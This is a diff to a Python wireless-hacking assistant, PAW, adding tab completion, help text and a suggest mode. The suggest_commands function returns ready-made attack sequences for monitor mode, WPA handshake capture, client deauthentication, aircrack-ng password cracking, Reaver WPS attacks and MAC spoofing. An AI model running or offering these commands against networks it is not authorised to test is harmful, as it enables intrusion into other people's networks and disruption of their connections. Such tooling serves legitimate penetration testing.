@@ -16,6 +16,20 @@ from typing import List, Dict, Optional, Tuple, Any
 import traceback
 
 try:
+    # Add readline support for command history and tab completion
+    import readline
+    READLINE_AVAILABLE = True
+except ImportError:
+    READLINE_AVAILABLE = False
+
+try:
+    # Try to import the autocomplete module
+    from autocomplete import setup_completion
+    AUTOCOMPLETE_AVAILABLE = True
+except ImportError:
+    AUTOCOMPLETE_AVAILABLE = False
+
+try:
     from rich.console import Console
     from rich.panel import Panel
     from rich.text import Text
@@ -47,6 +61,52 @@ interface_manager = InterfaceManager()
 db = NetworkDatabase()
 last_command_output = None
 use_context = True
+
+# Suggest mode
+SUGGEST_MODE = False
+
+# Command completion keywords
+COMPLETION_KEYWORDS = [
+    "help", "exit", "quit",
+    "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "wifite", "reaver",
+    "monitor mode", "scan network", "capture handshake", "crack password", "deauth",
+    "scan port", "change mac", "wps attack", "nmap", "hydra", "hashcat",
+    "metasploit", "msfconsole", "wireshark", "tshark", "macchanger"
+]
+
+# Setup readline completion
+def setup_readline():
+    """Setup readline for history and completion"""
+    if not READLINE_AVAILABLE:
+        return
+        
+    # Setup command history
+    history_file = os.path.expanduser("~/.paw_history")
+    try:
+        readline.read_history_file(history_file)
+        readline.set_history_length(100)
+    except FileNotFoundError:
+        pass
+    
+    # Save history when exiting
+    import atexit
+    atexit.register(lambda: readline.write_history_file(history_file))
+    
+    # Setup completion
+    if AUTOCOMPLETE_AVAILABLE:
+        # Use the enhanced autocomplete module
+        setup_completion(COMPLETION_KEYWORDS)
+    else:
+        # Use basic completion
+        def completer(text, state):
+            options = [i for i in COMPLETION_KEYWORDS if i.startswith(text)]
+            if state < len(options):
+                return options[state]
+            else:
+                return None
+        
+        readline.parse_and_bind("tab: complete")
+        readline.set_completer(completer)
 
 # Signal handler for graceful exit
 def signal_handler(sig, frame):
@@ -220,12 +280,23 @@ def interactive_mode() -> None:
     """Run PAW in interactive mode"""
     print_banner()
     
+    # Setup readline for history and completion
+    setup_readline()
+    
     if RICH_AVAILABLE:
         console.print("[bold green]Welcome to PAW - Prompt Assistant for Wireless[/bold green]")
-        console.print("[italic]Type [bold]help[/bold] for assistance or [bold]exit[/bold] to quit.[/italic]\n")
+        if SUGGEST_MODE:
+            console.print("[bold yellow]Running in SUGGEST mode - commands will only be suggested, not executed[/bold yellow]")
+        console.print("[italic]Type [bold]help[/bold] for assistance or [bold]exit[/bold] to quit.[/italic]")
+        if READLINE_AVAILABLE:
+            console.print("[italic]Use TAB for command completion and arrow keys for history.[/italic]\n")
     else:
         print("Welcome to PAW - Prompt Assistant for Wireless")
-        print("Type 'help' for assistance or 'exit' to quit.\n")
+        if SUGGEST_MODE:
+            print("Running in SUGGEST mode - commands will only be suggested, not executed")
+        print("Type 'help' for assistance or 'exit' to quit.")
+        if READLINE_AVAILABLE:
+            print("Use TAB for command completion and arrow keys for history.\n")
     
     try:
         # Check if running with admin/root privileges
@@ -270,6 +341,12 @@ def interactive_mode() -> None:
                 show_help()
                 continue
                 
+            # In suggest mode, just provide command suggestions
+            if SUGGEST_MODE:
+                suggestions = suggest_commands(user_input)
+                display_output(suggestions, "Suggested Commands")
+                continue
+                
             # Process commands with context if enabled
             context_to_use = last_command_output if use_context and last_command_output else None
             
@@ -312,42 +389,38 @@ def interactive_mode() -> None:
 
 def show_help() -> None:
     """Show help information for PAW"""
+    help_text = """
+PAW - Prompt Assistant for Wireless
+
+USAGE:
+  1. Ask about wireless tools or techniques using natural language
+     Example: "How do I crack a WPA password?"
+  
+  2. Execute commands directly
+     Example: "airmon-ng start wlan0"
+     
+  3. Type 'exit' or 'quit' to exit
+
+PAW will provide context about relevant tools based on keywords
+in your query, or execute commands directly when recognized.
+
+When running in SUGGEST mode (-s), PAW will only suggest commands
+to run rather than executing them. This is useful for:
+  - Learning what commands are needed for specific tasks
+  - Creating scripts or step-by-step guides
+  - Safely exploring options without executing potentially harmful commands
+
+To use suggest mode:
+  - Run 'python paw.py -s' to start in suggest mode
+  - Or use 'python paw.py -s "your query here"' for a one-time suggestion
+"""
+    
     if RICH_AVAILABLE:
-        help_table = Table(title="PAW Commands", box=box.ROUNDED)
-        help_table.add_column("Command", style="cyan")
-        help_table.add_column("Description", style="green")
-        
-        # Add command rows
-        help_table.add_row("help", "Show this help message")
-        help_table.add_row("exit, quit, q", "Exit PAW")
-        help_table.add_row("interface list", "List available network interfaces")
-        help_table.add_row("interface monitor [interface]", "Enable monitor mode on interface")
-        help_table.add_row("interface managed [interface]", "Set interface to managed mode")
-        help_table.add_row("scan networks [interface]", "Scan for wireless networks")
-        help_table.add_row("capture start [interface] [bssid] [channel]", "Start capturing packets")
-        help_table.add_row("capture stop", "Stop packet capture")
-        help_table.add_row("attack deauth [interface] [bssid] [client] [count]", "Send deauth packets")
-        help_table.add_row("db list", "List saved networks in database")
-        help_table.add_row("db export [filename]", "Export database to CSV")
-        help_table.add_row("macchanger [options] [interface]", "Change MAC address")
-        help_table.add_row("[natural language]", "Ask about wireless hacking tasks")
-        
-        console.print(help_table)
+        console.print(Panel(help_text, title="Help", border_style="green"))
     else:
-        print("PAW Commands:")
-        print("  help                                 - Show this help message")
-        print("  exit, quit, q                        - Exit PAW")
-        print("  interface list                       - List available network interfaces")
-        print("  interface monitor [interface]        - Enable monitor mode on interface")
-        print("  interface managed [interface]        - Set interface to managed mode")
-        print("  scan networks [interface]            - Scan for wireless networks")
-        print("  capture start [i] [bssid] [channel]  - Start capturing packets")
-        print("  capture stop                         - Stop packet capture")
-        print("  attack deauth [i] [bssid] [client]   - Send deauth packets")
-        print("  db list                              - List saved networks in database")
-        print("  db export [filename]                 - Export database to CSV")
-        print("  macchanger [options] [interface]     - Change MAC address")
-        print("  [natural language]                   - Ask about wireless hacking tasks")
+        print("\n--- Help ---")
+        print(help_text)
+        print("------------\n")
 
 def handle_interface_command(args: List[str]) -> None:
     """Handle commands related to network interfaces"""
@@ -712,18 +785,125 @@ def handle_database_command(args: List[str]) -> None:
     else:
         display_output(f"Unknown database subcommand: {subcommand}", "Error")
 
+def suggest_commands(prompt: str) -> str:
+    """
+    Generate suggested commands based on the user's prompt
+    
+    Args:
+        prompt: The user's input prompt
+        
+    Returns:
+        A string containing the suggested commands
+    """
+    # Common command patterns based on keywords
+    command_patterns = {
+        "monitor mode": [
+            "# Enable monitor mode on wireless interface",
+            "airmon-ng check kill",
+            "airmon-ng start wlan0  # Replace wlan0 with your interface"
+        ],
+        "scan network": [
+            "# Scan for wireless networks",
+            "airodump-ng wlan0mon  # Replace wlan0mon with your monitor interface"
+        ],
+        "capture handshake": [
+            "# Capture WPA handshake",
+            "airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0mon",
+            "# In a new terminal window, run:",
+            "aireplay-ng -0 5 -a [MAC_ADDRESS] -c [CLIENT_MAC] wlan0mon"
+        ],
+        "crack password": [
+            "# Crack captured handshake",
+            "aircrack-ng -w /path/to/wordlist.txt capture*.cap"
+        ],
+        "deauth": [
+            "# Deauthenticate client(s) from access point",
+            "aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon  # Specific client",
+            "# Or to deauthenticate all clients:",
+            "aireplay-ng -0 10 -a [AP_MAC] wlan0mon"
+        ],
+        "scan port": [
+            "# Basic port scan",
+            "nmap [TARGET_IP]",
+            "# More comprehensive scan",
+            "nmap -sV -p- -A [TARGET_IP]"
+        ],
+        "change mac": [
+            "# Change MAC address",
+            "ifconfig [INTERFACE] down",
+            "macchanger -r [INTERFACE]  # Random MAC",
+            "# Or specify a MAC:",
+            "macchanger -m XX:XX:XX:XX:XX:XX [INTERFACE]",
+            "ifconfig [INTERFACE] up"
+        ],
+        "wps attack": [
+            "# WPS attack using Reaver",
+            "reaver -i wlan0mon -b [TARGET_BSSID] -vv"
+        ]
+    }
+    
+    prompt_lower = prompt.lower()
+    results = []
+    
+    # Check for exact matches first
+    for key_phrase, commands in command_patterns.items():
+        if key_phrase in prompt_lower:
+            results.extend(commands)
+    
+    # If no exact matches, try to infer intent
+    if not results:
+        if any(word in prompt_lower for word in ["wifi", "wireless", "wlan", "wpa", "network"]):
+            if any(word in prompt_lower for word in ["hack", "crack", "break", "attack"]):
+                results = [
+                    "# Full WiFi hacking process",
+                    "# 1. Enable monitor mode",
+                    "airmon-ng check kill",
+                    "airmon-ng start wlan0",
+                    "# 2. Scan for networks",
+                    "airodump-ng wlan0mon",
+                    "# 3. Target a network and capture handshake",
+                    "airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon",
+                    "# 4. In a new terminal, force handshake",
+                    "aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon",
+                    "# 5. Crack the password",
+                    "aircrack-ng -w /path/to/wordlist.txt capture*.cap"
+                ]
+    
+    # If still no results, provide a default message
+    if not results:
+        return "Could not determine specific commands for your request. Try being more specific or use one of these common terms: monitor mode, scan network, capture handshake, crack password, deauth, scan port, change mac, wps attack."
+    
+    return "\n".join(results)
+
 def main():
+    global SUGGEST_MODE
+    
     parser = argparse.ArgumentParser(description="PAW - Prompt Assistant for Wireless")
     parser.add_argument("--version", action="version", version="PAW v0.1")
-    parser.add_argument("--interactive", action="store_true", help="Run in interactive mode")
-    
-    # Add other arguments as needed
+    parser.add_argument("-s", "--suggest", action="store_true", help="Suggest mode - only print commands, don't execute them")
+    parser.add_argument("query", nargs="*", help="Optional query to process in non-interactive mode")
     
     args = parser.parse_args()
     
-    # Run in interactive mode by default or if specified
-    if args.interactive or len(sys.argv) == 1:
-        interactive_mode()
+    # Set suggest mode if specified
+    SUGGEST_MODE = args.suggest
+    
+    # Process a single query if provided
+    if args.query:
+        query = " ".join(args.query)
+        if SUGGEST_MODE:
+            suggestions = suggest_commands(query)
+            print(suggestions)
+        else:
+            context = get_context_for_prompt(query)
+            if context:
+                print(context)
+            else:
+                print("No relevant context found for your query.")
+        return
+    
+    # Run in interactive mode
+    interactive_mode()
     
 if __name__ == "__main__":
     main() 
